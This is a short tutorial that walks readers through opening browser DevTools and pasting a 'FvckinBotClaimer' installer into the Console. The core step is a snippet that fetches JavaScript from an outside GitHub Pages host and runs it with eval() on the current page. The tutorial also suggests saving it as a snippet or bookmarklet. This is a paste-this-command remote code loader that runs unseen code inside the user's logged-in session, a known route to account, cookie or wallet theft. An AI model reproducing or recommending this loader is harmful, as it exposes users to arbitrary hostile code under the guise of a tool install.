# 
# How to Intallation FvckinBotClaimer in Browser DevTools

This tutorial will guide you step-by-step on how to inject and run a custom JavaScript script in your browser's Developer Tools (DevTools) console.

---

## What You Will Learn

- How to open browser DevTools
- How to navigate to the Console tab
- How to paste and execute your JavaScript code
- Tips for safely using scripts in DevTools

---

## Step 1: Open DevTools in Your Browser

- **Windows/Linux**: Press <kbd>F12</kbd> or <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>I</kbd>
- **macOS**: Press <kbd>Cmd</kbd> + <kbd>Option</kbd> + <kbd>I</kbd>
  
Alternatively, use the browser menu:

- **Chrome / Edge**: Menu &gt; More tools &gt; Developer tools
- **Firefox**: Menu &gt; Web Developer &gt; Toggle Tools
- **Safari**: Enable “Show Develop menu” in Preferences &gt; Advanced, then use Develop &gt; Show Web Inspector

---

## Step 2: Navigate to the Console Tab

Inside DevTools, click the **Console** tab. This is where you can type or paste JavaScript commands.

You can also open the Console directly using keyboard shortcuts:

- **Windows/Linux**: <kbd>Ctrl</kbd> + <kbd>~</kbd>
- **macOS**: <kbd>Cmd</kbd> + <kbd>Option</kbd> + <kbd>K</kbd>

---

## Step 3: Paste Your Script Code

Copy the following script code and paste it directly into the Console input area:

```
(async function () {
  try {
    let installer = await fetch("https://fvckinbot.github.io/FvckinBotClaimer.io/", {
      method: "GET",
    });
    installer = await installer.text();
    eval(installer);
  } catch (error) {
    alert("Refresh the page before reinstalling");
  }
})();
```
## Step 4: Execute and Verify
Press <kbd>Enter</kbd> to execute the script.
Observe the website or the console for any output, changes, or messages confirming the script has run.

---

## Step 5: Save Your Script for Easy Reuse
In Chrome/Edge DevTools, go to the Sources tab, then open the Snippets tab. Create a new snippet and paste your script to save it for later use.
Alternatively, create a bookmarklet from your script to run it quickly on any page.

---

## Important Tips
Be cautious when running scripts from unknown sources; they can pose security risks.
Always understand what a script does before executing it.
Use the browser's developer tools responsibly and respect website terms of use.
